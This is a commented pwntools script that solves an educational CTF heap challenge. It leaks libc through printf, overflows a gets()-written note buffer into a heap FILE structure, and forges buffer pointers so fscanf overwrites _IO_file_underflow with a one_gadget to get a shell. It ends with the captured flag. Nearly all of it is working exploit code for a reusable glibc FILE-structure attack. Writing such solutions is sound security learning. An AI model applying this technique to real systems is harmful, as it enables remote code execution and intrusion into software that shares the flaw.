from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 30217)

r.recvuntil(b'0x')
# This time the return address is not the chunk address but the address of printf
# Calculate the address of libcbase by subtracting printf address with its offset
l = ELF('./libc.so.6')
libc = int(r.recvline(), 16) - l.sym['printf']

# note_buf can be overflowed due to write_note() function using gets()
# Thus we can use create_note() to create a new note and get a new chunk
# and the value inside this chunk can be overflowed by buf_note
# And since this chunk will be used as file structure in load_note() function
# If we change the buffer pointer of this new chunk to point to the function pointer
# which will be used by fscanf
# we can write onegadget's address to this space and after executing fscanf
# the onegadget will be called and executed
# In this case we choose _IO_file_underflow

# create_note()
r.sendlineafter(b'>', b'1')

# write_note() for overflow
r.sendlineafter(b'>', b'2')
# Calculate offset for overflow
# This can be calculated by first find address of _flags in file structure of the chunk created by create_note
# Then subtract it with note_buf
offset = 0x210
# Calculate _IO_file_jumps address which is the first function pointed by vtable
# This can be known by typing ```p{struct _IO_FILE_plus}0x563fd69f04b0``` in gdb
# The address is the start address of the file structure and can be known by ```heap```
_IO_file_jumps = libc + l.sym['_IO_file_jumps']
# After finding the first entry we need to find the offset from this address to our target function address _IO_file_underflow
# By typing ```telescope 0x7fb68d9714a0``` it'll parse all the entries, interpret it as pointer, and output all the address pointed by the pointer
_IO_file_underflow = _IO_file_jumps + 0x20
# onegadget can be found by using one_gadget tool
one_gadget = p64(libc + 0xe6c81)
# Create fake file structure to make the pointer points to vtable
""" Conditions for arbitrary read
_flags &= ~_IO_EOF_SEEN
_flags &= ~_IO_NO_READS
_IO_read_ptr >= _IO_read_end
_IO_buf_base != NULL
"""
_flags = 0x0
payload = fake_file_struct = flat(
    _flags, 0,
    0, 0,
    0, 0,
    # _IO_buf_base = start address of buffer to be wrote
    0, _IO_file_underflow,
    # _IO_buf_end = end address of buffer to be wrote
    _IO_file_underflow + 0x8, 0,
    0, 0,
    0, 0,
    # fileno = 0 = stdin
    0
)
r.sendlineafter(b"data> ", b'A'*offset + payload)
r.sendlineafter(b'>', b'4')
r.sendline(one_gadget)
r.interactive()

#FLAG{600d_mu51c_53r135_p4r7_3_youtu.be/dQw4w9WgXcQ}